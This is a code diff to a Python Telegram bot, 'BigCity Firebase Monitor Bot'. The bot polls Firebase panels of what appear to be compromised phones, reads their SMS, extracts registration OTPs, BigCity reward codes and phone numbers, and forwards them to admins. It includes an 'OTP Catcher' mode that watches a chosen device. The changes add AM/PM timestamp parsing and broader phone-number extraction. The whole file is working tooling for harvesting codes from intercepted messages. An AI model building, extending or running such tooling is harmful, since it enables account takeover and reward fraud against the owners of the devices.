@@ -1,5 +1,5 @@
 """
-BigCity Firebase Monitor Bot (Panel Add Baseline Fix)
+BigCity Firebase Monitor Bot (AM/PM Time Fixed + Exact Number)
 """
 import asyncio
 import json
@@ -51,7 +51,7 @@ active_watches = set()
 REWARD_PATTERN = re.compile(r"Reward\s*Code\s*(?:is|:)\s*([A-Z0-9]{6,20})", re.IGNORECASE)
 OTP_PATTERN    = re.compile(r"OTP\s*to\s*register\s*(?:is|:)\s*(\d{4,8})", re.IGNORECASE)
 BIGCITY_HINT   = re.compile(r"big\s*city", re.IGNORECASE)
-PHONE_PATTERN = re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")
+PHONE_PATTERN  = re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")
 
 # ─── DATA MANAGEMENT ──────────────────────────────────────────────────────────
 
@@ -174,14 +174,17 @@ def clean_number(val: str) -> str:
 
 def _extract_number(d: dict) -> str:
     if not isinstance(d, dict): return ""
+    # 1. Direct fields
     for f in ("Phone Number", "phoneNumber", "phone", "number", "mobile"):
         if f in d and d[f]:
             cleaned = clean_number(d[f])
             if cleaned: return cleaned
-    for f in ("Phone #1", "Phone_1", "phone1", "Phone #2", "Phone_2", "phone2"):
+    # 2. Sim/SMS fields
+    for f in ("Phone #1", "Phone_1", "phone1", "Phone #2", "Phone_2", "phone2", "sim_number"):
         if f in d and d[f]:
             cleaned = clean_number(d[f])
             if cleaned: return cleaned
+    # 3. Deep Nested Search
     for k, v in d.items():
         if isinstance(v, dict):
             res = _extract_number(v)
@@ -193,6 +196,38 @@ def extract_number_from_msg_text(text: str) -> str:
     match = PHONE_PATTERN.search(text)
     if match: return clean_number(match.group(1))
     return ""
+
+# ─── TIME PARSER (AM/PM FIX) ─────────────────────────────────────────────────
+def get_msg_timestamp(md: dict) -> float:
+    dt_str = md.get("dateTime", md.get("time", md.get("timestamp", "")))
+    if not dt_str: return 0.0
+
+    if isinstance(dt_str, (int, float)):
+        return (dt_str / 1000.0) if dt_str > 1e12 else float(dt_str)
+
+    dt_str = str(dt_str).strip()
+
+    # 1. Parse "07-11-2026 | 08:25 am" ya "07-11-2026 | 08:25 pm"
+    match = re.search(r'(\d{1,2}-\d{1,2}-\d{4})\s*\|\s*(\d{1,2}:\d{2}\s*[apAP][mM])', dt_str)
+    if match:
+        try:
+            date_part = match.group(1)
+            time_part = match.group(2).lower()
+            dt = datetime.strptime(f"{date_part} {time_part}", "%d-%m-%Y %I:%M %p")
+            return dt.timestamp()
+        except Exception: pass
+
+    # 2. Parse without AM/PM (normal 24h format)
+    match2 = re.search(r'(\d{1,2}-\d{1,2}-\d{4})\s*\|\s*(\d{1,2}:\d{2})', dt_str)
+    if match2:
+        try:
+            date_part = match2.group(1)
+            time_part = match2.group(2)
+            dt = datetime.strptime(f"{date_part} {time_part}", "%d-%m-%Y %H:%M")
+            return dt.timestamp()
+        except Exception: pass
+
+    return 0.0
 
 async def fetch_online_devices(client, base, dev_node):
     path = f"/{dev_node}" if dev_node else ""
@@ -274,17 +309,18 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
             mid = str(md.get("id", mk))
             key = f"{pk}:{did}:{mid}"
             
-            # Agar message pehle se memory mein hai, toh skip
             if state.get(key): continue
             
-            # Naya panel add hua hai? Toh pehle is panel ke saare purane messages ko read mark karo
             init_key = f"init:{pk}"
             if not state.get(init_key):
-                state[key] = True
-                continue
+                state[key] = True; continue
             
-            # Bot start hone ke baad 10 second tak sab read mark karo
             if (time.time() - BOT_START_TIME) < BASELINE_DELAY or not IS_INITIALIZED:
+                state[key] = True; continue
+            
+            # AM/PM TIMESTAMP CHECK
+            msg_time = get_msg_timestamp(md)
+            if msg_time > 0 and msg_time < BOT_START_TIME:
                 state[key] = True; continue
             
             text = extract_text(md)
@@ -335,7 +371,6 @@ async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
                     online = await asyncio.wait_for(fetch_online_devices(client, base, pc.get("device_node","")), timeout=25)
                     if not online: continue
                     
-                    # Naya panel baseline (agar naya add hua hai)
                     if not state.get(init_key):
                         for did, _ in online:
                             try: 
@@ -415,7 +450,7 @@ async def otp_watch(app, chat_id, pk, did):
                 if isinstance(dd, dict): dev_num = _extract_number(dd)
             except Exception: pass
                 
-            watch_msg = await app.bot.send_message(chat_id, f"🎯 <b>OTP Catcher active</b> — <code>{did}</code>\nMax 5 min, sirf naya OTP.\n<i>(Manually band karne ke liye niche button dabayein)</i>", parse_mode="HTML", reply_markup=stop_btn)
+            watch_msg = await app.bot.send_message(chat_id, f"🎯 <b>OTP Catcher active</b> — <code>{did}</code>\nNumber: <code>{dev_num or 'N/A'}</code>\nMax 5 min, sirf naya OTP.\n<i>(Manually band karne ke liye niche button dabayein)</i>", parse_mode="HTML", reply_markup=stop_btn)
             last_ping = time.time()
             while time.time() < end_at:
                 if did not in active_watches:
@@ -460,7 +495,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cid = update.effective_chat.id
     if not is_admin(cid): return await update.message.reply_text("❌ Aap Admin nahi hain.")
     kb = ReplyKeyboardMarkup([["📊 Status","📋 My Panels"],["➕ Add Panel","❌ Remove Panel"],["👑 Admin Panel"]], resize_keyboard=True)
-    await update.message.reply_text(f"🤖 <b>BigCity Firebase Monitor</b>\n\n• Super Fast (5s Scan)\n• Sirf NAYE messages\n• Number from SMS Text\n• 🎯 OTP Catcher (5 min)\n\n👤 <code>{cid}</code>", parse_mode="HTML", reply_markup=kb)
+    await update.message.reply_text(f"🤖 <b>BigCity Firebase Monitor</b>\n\n• Super Fast (5s Scan)\n• Sirf NAYE messages\n• Number from Device Data\n• 🎯 OTP Catcher (5 min)\n\n👤 <code>{cid}</code>", parse_mode="HTML", reply_markup=kb)
 
 async def admin_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_chat.id): return
